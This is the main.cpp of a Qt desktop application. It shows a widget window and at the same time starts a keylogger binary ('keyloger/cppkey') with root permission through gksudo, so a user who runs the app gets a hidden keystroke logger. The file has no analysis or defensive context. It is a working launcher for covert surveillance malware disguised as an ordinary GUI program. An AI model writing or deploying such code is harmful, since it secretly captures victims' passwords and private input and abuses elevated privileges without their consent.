#include "widget.h"
#include <QApplication>


int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    Widget w;

    //for inter process communication
      QProcess p;
      p.start("gksudo keyloger/cppkey");//will start binary with root permission

       w.show();

    return a.exec();
}
